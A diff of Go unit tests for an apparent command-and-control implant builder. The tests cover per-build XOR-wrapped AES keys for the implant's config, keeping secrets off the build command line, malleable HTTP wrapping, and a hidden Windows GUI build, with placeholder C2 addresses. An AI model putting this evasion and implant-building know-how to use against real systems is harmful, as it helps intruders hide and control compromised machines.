@@ -6,13 +6,49 @@ import (
 	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
+	"os"
+	"path/filepath"
+	"strings"
 	"testing"
 )
 
-// decodeBlobForTest mirrors the agent's decryptConfigBlob (AES-256-GCM with
-// configBlobKeyHex) so we can validate the server-produced blob round-trips.
-func decodeBlobForTest(blob string) ([]byte, bool) {
-	key, err := hex.DecodeString(configBlobKeyHex)
+// recoverBlobKeyHex decodes the strxor-encoded per-build SConfigKey (exactly as
+// the agent's mustDecrypt does) back into the raw AES-256 key hex.
+func recoverBlobKeyHex(sConfigKey string) (string, bool) {
+	idx := -1
+	for i := 0; i+1 <= len(sConfigKey); i++ {
+		if sConfigKey[i] == ':' {
+			idx = i
+			break
+		}
+	}
+	if idx < 0 {
+		return "", false
+	}
+	xorKey, err := hex.DecodeString(sConfigKey[:idx])
+	if err != nil {
+		return "", false
+	}
+	data, err := base64.StdEncoding.DecodeString(sConfigKey[idx+1:])
+	if err != nil {
+		return "", false
+	}
+	if len(xorKey) != len(data) {
+		return "", false
+	}
+	out := make([]byte, len(data))
+	for i := range data {
+		out[i] = data[i] ^ xorKey[i]
+	}
+	return string(out), true
+}
+
+// decodeBlobForTest mirrors the agent's decryptConfigBlob (AES-256-GCM with the
+// per-build key recovered from sConfigKey) so we can validate the produced blob
+// round-trips. No static/shared key exists anymore — every build uses a unique
+// key delivered via strxor.
+func decodeBlobForTestKeyed(blob, keyHex string) ([]byte, bool) {
+	key, err := hex.DecodeString(keyHex)
 	if err != nil {
 		return nil, false
 	}
@@ -43,8 +79,12 @@ func TestBuildConfigBlobCarriesMalleableWrapping(t *testing.T) {
 		MalleablePrepend: "<html><body>",
 		MalleableAppend:  "</body></html>",
 	}
-	blob := buildConfigBlob(cfg, defaultMalleableProfile())
-	raw, ok := decodeBlobForTest(blob)
+	blob, sConfigKey := buildConfigBlobKeyed(cfg, defaultMalleableProfile())
+	keyHex, ok := recoverBlobKeyHex(sConfigKey)
+	if !ok {
+		t.Fatal("failed to recover per-build key")
+	}
+	raw, ok := decodeBlobForTestKeyed(blob, keyHex)
 	if !ok {
 		t.Fatal("blob did not decode")
 	}
@@ -75,12 +115,16 @@ func TestBuildConfigBlobRoundTrip(t *testing.T) {
 		DNSDomain:     "dns.evil.test",
 	}
 
-	blob := buildConfigBlob(cfg, profile)
-	if blob == "" {
-		t.Fatal("buildConfigBlob returned empty")
+	blob, sConfigKey := buildConfigBlobKeyed(cfg, profile)
+	if blob == "" || sConfigKey == "" {
+		t.Fatal("buildConfigBlobKeyed returned empty")
 	}
 
-	raw, ok := decodeBlobForTest(blob)
+	keyHex, ok := recoverBlobKeyHex(sConfigKey)
+	if !ok {
+		t.Fatal("failed to recover per-build key")
+	}
+	raw, ok := decodeBlobForTestKeyed(blob, keyHex)
 	if !ok {
 		t.Fatal("blob did not decode in the agent's xor format")
 	}
@@ -144,10 +188,19 @@ func TestBuildLdflagsUsesSingleConfigBlob(t *testing.T) {
 		BeaconKey: "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899",
 	}
 
-	ldflags := buildLdflags(cfg, profile, "windows")
+	ldflags, blob, sConfigKey := buildLdflags(cfg, profile, "windows")
 
-	if !containsString(ldflags, `-X "main.ConfigBlob=`) {
-		t.Fatalf("ldflags missing ConfigBlob injection: %s", ldflags)
+	// The config blob and its key are delivered via a generated temp source
+	// file (writeConfigInjectFile), NOT the go build argv (B2), so they must
+	// NOT appear in ldflags.
+	if containsString(ldflags, `-X "main.ConfigBlob=`) {
+		t.Fatalf("ConfigBlob must not be on the build argv: %s", ldflags)
+	}
+	if containsString(ldflags, `-X "main.SConfigKey=`) {
+		t.Fatalf("SConfigKey must not be on the build argv: %s", ldflags)
+	}
+	if blob == "" || sConfigKey == "" {
+		t.Fatalf("buildLdflags returned empty blob/key: blob=%q sKey=%q", blob, sConfigKey)
 	}
 	// No more per-field ldflags for config values.
 	for _, old := range []string{"main.C2URL=", "main.BeaconKeyStr=", "main.IntervalStr=", "main.SSHHostKeyStr="} {
@@ -160,11 +213,129 @@ func TestBuildLdflagsUsesSingleConfigBlob(t *testing.T) {
 		t.Errorf("windowsgui flag missing: %s", ldflags)
 	}
 	// Linux must NOT include windowsgui.
-	ldflagsLinux := buildLdflags(cfg, profile, "linux")
+	ldflagsLinux, _, _ := buildLdflags(cfg, profile, "linux")
 	if containsString(ldflagsLinux, "-H=windowsgui") {
 		t.Errorf("linux build should not include -H=windowsgui")
 	}
 	if !containsString(ldflags, "-buildid=") {
 		t.Errorf("buildid flag missing")
+	}
+}
+
+// TestWriteConfigInjectFile verifies the B2 secret-delivery mechanism: the
+// per-build config blob and key are emitted into an ephemeral init() source file
+// (and never the build argv).
+func TestWriteConfigInjectFile(t *testing.T) {
+	dir := t.TempDir()
+	if err := writeConfigInjectFile(dir, "BASE64BLOB==", "ab:cd"); err != nil {
+		t.Fatalf("writeConfigInjectFile: %v", err)
+	}
+	data, err := os.ReadFile(filepath.Join(dir, "zz_config_inject.go"))
+	if err != nil {
+		t.Fatalf("inject file not written: %v", err)
+	}
+	src := string(data)
+	if !strings.Contains(src, "func init() {") {
+		t.Errorf("inject file missing init(): %s", src)
+	}
+	if !strings.Contains(src, `ConfigBlob = "BASE64BLOB=="`) {
+		t.Errorf("inject file missing ConfigBlob assignment: %s", src)
+	}
+	if !strings.Contains(src, `SConfigKey = "ab:cd"`) {
+		t.Errorf("inject file missing SConfigKey assignment: %s", src)
+	}
+	// Empty secrets must be a no-op (no file written, defaults stand).
+	emptyDir := t.TempDir()
+	if err := writeConfigInjectFile(emptyDir, "", ""); err != nil {
+		t.Fatalf("writeConfigInjectFile(empty): %v", err)
+	}
+	if _, err := os.Stat(filepath.Join(emptyDir, "zz_config_inject.go")); err == nil {
+		t.Errorf("empty secrets should not write an inject file")
+	}
+}
+
+// TestBuildConfigBlobKeyedRoundTrip validates the per-build key contract: the
+// blob produced by buildConfigBlobKeyed decrypts with the AES key recovered from
+// the strxor-encoded sConfigKey exactly as the agent does (mustDecrypt + AES-GCM).
+func TestBuildConfigBlobKeyedRoundTrip(t *testing.T) {
+	profile := defaultMalleableProfile()
+	cfg := ImplantConfig{
+		C2URL:     "http://10.2.2.7:8443",
+		Protocol:  "http",
+		Interval:  17,
+		Jitter:    9,
+		BeaconKey: "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899",
+	}
+	blob, sConfigKey := buildConfigBlobKeyed(cfg, profile)
+	if blob == "" || sConfigKey == "" {
+		t.Fatal("buildConfigBlobKeyed returned empty")
+	}
+
+	// Replicate the agent's strxor decode (mustDecrypt) to recover the hex key.
+	idx := -1
+	for i := 0; i+1 <= len(sConfigKey); i++ {
+		if sConfigKey[i] == ':' {
+			idx = i
+			break
+		}
+	}
+	if idx < 0 {
+		t.Fatal("sConfigKey missing separator")
+	}
+	xorKey, err := hex.DecodeString(sConfigKey[:idx])
+	if err != nil {
+		t.Fatalf("xor key decode: %v", err)
+	}
+	data, err := base64.StdEncoding.DecodeString(sConfigKey[idx+1:])
+	if err != nil {
+		t.Fatalf("data decode: %v", err)
+	}
+	if len(xorKey) != len(data) {
+		t.Fatalf("xor key/data length mismatch %d vs %d", len(xorKey), len(data))
+	}
+	aesKeyHexBytes := make([]byte, len(data))
+	for i := range data {
+		aesKeyHexBytes[i] = data[i] ^ xorKey[i]
+	}
+	aesKey, err := hex.DecodeString(string(aesKeyHexBytes))
+	if err != nil {
+		t.Fatalf("aes key hex decode: %v", err)
+	}
+	if len(aesKey) != 32 {
+		t.Fatalf("aes key length %d, want 32", len(aesKey))
+	}
+
+	// AES-256-GCM decrypt the blob with the recovered key (agent contract).
+	block, err := aes.NewCipher(aesKey)
+	if err != nil {
+		t.Fatalf("aes newcipher: %v", err)
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		t.Fatalf("gcm: %v", err)
+	}
+	raw, err := base64.StdEncoding.DecodeString(blob)
+	if err != nil || len(raw) < gcm.NonceSize() {
+		t.Fatal("blob decode")
+	}
+	plain, err := gcm.Open(nil, raw[:gcm.NonceSize()], raw[gcm.NonceSize():], nil)
+	if err != nil {
+		t.Fatalf("gcm open (agent would fail to decrypt): %v", err)
+	}
+	var got agentConfigJSON
+	if err := json.Unmarshal(plain, &got); err != nil {
+		t.Fatalf("json: %v", err)
+	}
+	if got.C2URL != cfg.C2URL {
+		t.Errorf("C2URL mismatch: got %q want %q", got.C2URL, cfg.C2URL)
+	}
+	if got.BeaconKey != cfg.BeaconKey {
+		t.Errorf("BeaconKey mismatch")
+	}
+
+	// Distinct builds must use distinct keys (no fleet-wide constant remains).
+	_, sConfigKey2 := buildConfigBlobKeyed(cfg, profile)
+	if sConfigKey2 == sConfigKey {
+		t.Errorf("per-build keys must differ between builds")
 	}
 }
